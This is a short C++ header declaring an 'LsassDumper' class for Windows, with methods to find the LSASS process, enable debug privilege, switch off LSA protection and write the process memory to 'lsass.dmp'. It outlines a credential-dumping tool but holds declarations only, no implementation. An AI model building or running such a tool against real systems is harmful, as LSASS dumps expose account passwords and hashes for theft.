#pragma once

#include <windows.h>
#include <DbgHelp.h>
#include <TlHelp32.h>
#include <string>
#include <iostream>

class LsassDumper
{
public:
    LsassDumper();
    bool Dump(const std::wstring& dumpPath = L"lsass.dmp");
    bool IsRunningAsAdmin();
    void PrintError(const std::wstring& context);
    bool ModifyLsaProtection(bool disable);
    bool EnableDebugPrivilege();

private:
    DWORD GetLsassPID();
    HANDLE GetProcessHandle(DWORD pid);
};